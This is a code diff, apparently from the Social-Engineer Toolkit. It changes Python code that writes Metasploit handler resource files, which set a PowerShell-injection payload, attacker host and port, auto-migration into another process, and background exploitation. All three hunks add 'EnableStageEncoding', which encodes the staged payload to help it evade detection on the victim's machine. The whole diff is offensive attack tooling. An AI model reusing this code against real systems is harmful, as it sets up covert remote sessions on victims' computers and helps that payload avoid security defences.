@@ -48,7 +48,7 @@ if os.path.isfile("%s/meta_config_multipyinjector" % (setdir)):
             filewrite.write("\nuse exploit/multi/handler\n")
             if auto_migrate == "ON":
                 filewrite.write("set AutoRunScript post/windows/manage/smart_migrate\n")
-            filewrite.write("set PAYLOAD %s\nset LHOST %s\nset LPORT %s\nset ExitOnSession false\nexploit -j\n" % (powershell_inject_x86, ipaddr, port))
+            filewrite.write("set PAYLOAD %s\nset LHOST %s\nset LPORT %s\nset EnableStageEncoding true\nset ExitOnSession false\nexploit -j\n" % (powershell_inject_x86, ipaddr, port))
             filewrite.close()
 
 # if we have multi injection on, don't worry about these
@@ -96,7 +96,7 @@ if multi_injection == "on":
                     filewrite.write("\nuse exploit/multi/handler\n")
                     if auto_migrate == "ON":
                         filewrite.write("set AutoRunScript post/windows/manage/smart_migrate\n")
-                    filewrite.write("set PAYLOAD %s\nset LHOST %s\nset LPORT %s\nset ExitOnSession false\nexploit -j\n\n" % (powershell_inject_x86, ipaddr, ports))
+                    filewrite.write("set PAYLOAD %s\nset LHOST %s\nset EnableStageEncoding true\nset LPORT %s\nset ExitOnSession false\nexploit -j\n\n" % (powershell_inject_x86, ipaddr, ports))
                     filewrite.close()
 
             # if we aren't using multi pyinjector
@@ -112,7 +112,7 @@ if multi_injection == "on":
                     filewrite.write("\nuse exploit/multi/handler\n")
                     if auto_migrate == "ON":
                         filewrite.write("set AutoRunScript post/windows/manage/smart_migrate\n")
-                    filewrite.write("set PAYLOAD %s\n set LHOST %s\nset ExitOnSession false\nset LPORT %s\nexploit -j\n\n" % (powershell_inject_x86, ipaddr, ports))
+                    filewrite.write("set PAYLOAD %s\n set LHOST %s\nset EnableStageEncoding true\nset ExitOnSession false\nset LPORT %s\nexploit -j\n\n" % (powershell_inject_x86, ipaddr, ports))
                     filewrite.close()
 
 # if its turned to off
